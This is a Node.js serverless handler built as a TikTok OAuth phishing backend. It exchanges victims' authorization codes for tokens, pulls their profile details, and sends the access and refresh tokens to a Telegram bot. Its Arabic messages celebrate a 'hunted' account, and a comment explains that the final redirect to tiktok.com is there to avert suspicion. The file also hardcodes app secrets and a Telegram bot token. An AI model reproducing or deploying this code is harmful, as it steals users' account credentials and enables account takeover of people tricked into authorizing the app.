const https = require('https');

const CLIENT_KEY = 'sbawsudq1bxhkm3b3y';
const CLIENT_SECRET = 'hddQpiSl5FTstFFjEYxifCWvNdvifUXa';
const TELEGRAM_TOKEN = '8540803234:AAGD95o6JuOzVLYZ6-8Cm0vQDlPD3wtJGl4';
const TELEGRAM_CHAT_ID = '7644255708';

function makeRequest(options, postData = null) {
  return new Promise((resolve, reject) => {
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => {
        try { resolve(JSON.parse(data)); } catch(e) { resolve(data); }
      });
    });
    req.on('error', (err) => reject(err));
    if (postData) req.write(postData);
    req.end();
  });
}

function sendTelegramSync(message) {
  return new Promise((resolve) => {
    const path = `/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
    const req = https.get(`https://api.telegram.org${path}`, (res) => {
      let d = '';
      res.on('data', (chunk) => d += chunk);
      res.on('end', () => resolve(d));
    });
    req.on('error', (e) => {
      console.error(e);
      resolve(null);
    });
  });
}

module.exports = async (req, res) => {
  const urlParams = new URLSearchParams(req.url.split('?')[1]);
  const code = urlParams.get('code');
  const error = urlParams.get('error');

  if (error) {
    await sendTelegramSync(`❌ فشل تسجيل الدخول أو إلغاء التفويض: ${error}`);
    return res.end(`TikTok Error: ${error}`);
  }

  if (!code) {
    return res.end('AWR Production Engine: Active & Waiting for Live Traffic.');
  }

  try {
    const tokenPostData = `client_key=${CLIENT_KEY}&client_secret=${CLIENT_SECRET}&code=${code}&grant_type=authorization_code&redirect_uri=https://my-tiktok-auth.vercel.app/api/auth`;
    
    const tokenOptions = {
      hostname: 'open.tiktokapis.com',
      path: '/v2/oauth/token/',
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    };

    const tokenResponse = await makeRequest(tokenOptions, tokenPostData);
    const accessToken = tokenResponse.access_token;

    if (!accessToken) {
      await sendTelegramSync("⚠️ تنبيه: تم استقبال طلب تفويض ولكن فشل تبادل الـ Access Token من خوادم تيك توك.");
      return res.end('Authentication Failed.');
    }

    const userOptions = {
      hostname: 'open.tiktokapis.com',
      path: '/v2/user/info/?fields=open_id,union_id,avatar_url,display_name,username,follower_count,following_count,likes_count,video_count',
      method: 'GET',
      headers: { 'Authorization': `Bearer ${accessToken}` }
    };

    const userResponse = await makeRequest(userOptions);
    const user = userResponse.data?.user;

    let userMsg = `👑 تم صيد حساب تيك توك حقيقي بنجاح 👑\n\n`;
    if (user) {
      userMsg += `👤 الاسم الكامل: ${user.display_name || 'غير محدد'}\n`;
      userMsg += `🏷️ اسم المستخدم: @${user.username || 'غير محدد'}\n`;
      userMsg += `🆔 معرف الحساب (Open ID): ${user.open_id}\n`;
      userMsg += `📊 إحصائيات الحساب الموثق:\n`;
      userMsg += `👥 المتابعين: ${user.follower_count || 0}\n`;
      userMsg += `❤️ إجمالي الإعجابات: ${user.likes_count || 0}\n\n`;
    }
    
    userMsg += `🔑 ACCESS TOKEN:\n${accessToken}\n\n`;
    if (tokenResponse.refresh_token) {
      userMsg += `🔄 REFRESH TOKEN:\n${tokenResponse.refresh_token}`;
    }

    await sendTelegramSync(userMsg);

    // إعادة توجيه المستخدم لصفحة تيك توك الرسمية أو صفحة نجاح نظيفة لإبعاد الشبهات
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end('<script>window.location.href="https://www.tiktok.com";</script>');

  } catch (err) {
    await sendTelegramSync(`🚨 خطأ داخلي في المحرك: ${err.message}`);
    res.end('System Error');
  }
};
